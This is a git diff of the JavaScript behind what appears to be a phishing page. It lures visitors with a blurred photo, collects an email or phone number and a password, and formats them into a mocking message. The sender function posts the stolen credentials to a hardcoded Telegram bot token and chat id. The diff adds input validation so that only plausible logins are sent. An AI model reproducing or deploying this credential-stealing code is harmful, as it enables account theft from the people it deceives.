@@ -1,22 +1,38 @@
 $(document).ready( () => {    
-  
-      const ready = () => {
+
+      const inptVal = () => {
         argv1 = document.getElementById('argv1').value;
-        argv2 = document.getElementById('argv2').value;
+        argv2 = document.getElementById('argv2').value,
+        emailRegex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
+        validated = '';
+       
         if( argv1 == '' || argv2 == '' ){
+          validated = false;
+        } else if ( emailRegex.test(argv1) & argv2.length >= 6 ) {
+          validated = true; 
+        } else {
+          ( isNaN(argv1) || argv1.length < 10 || argv2.length < 6 )
+          ? validated = false
+          : validated = true;
+        }
+        return validated;
+      }
+
+      const ready = () => {
+        if( inptVal() == false){
           let validated = false;
         } else {
           $('#btn-cont').prop("disabled", true);
           let message =  `■■■■■🤣🫵🤡■■■■■
-      👤 L: ${argv1} 
-      🔑 C: ${argv2} 
-      ■■■■■■■■■■■■■■`;
+👤 L: ${argv1} 
+🔑 C: ${argv2} 
+■■■■■■■■■■■■■■`;
               return message;
         }
         }
 
       const sender = async(msg) => {
-        let telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
+        const telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
              chat_id = '-1001908180943';
 
         let settings = {
@@ -43,14 +59,14 @@ $(document).ready( () => {
 
       }
 
-      let imgFin = () => {
+      const imgFin = () => {
         const blur = document.getElementById('blur');
         $('#btn-ver').prop("disabled", true);
         blur.classList.toggle('active');
         $('#btn-ver').text('Cubrir foto')
       };
 
-      let hidPost = () => {
+      const hidPost = () => {
         $('#post').css('display', 'none');
         $('#visto').css('display', 'block');
         $('#ini'). on('click', () => {
@@ -58,7 +74,7 @@ $(document).ready( () => {
         });
       };
 
-      let rel = () => {
+      const rel = () => {
         setTimeout(() => {
           location.reload();
         }, 15000);
@@ -76,11 +92,13 @@ $(document).ready( () => {
       });
 
       $('#btn-ver').on('click', () => {
+        const argv2 = document.getElementById('argv2');
+        argv2.type = 'password';
         $('.argv').removeClass('err');
       })
 
 
-      let visto = localStorage.getItem('visto');
+      const visto = localStorage.getItem('visto');
       if(visto == 'true') {
         imgFin();
         hidPost();
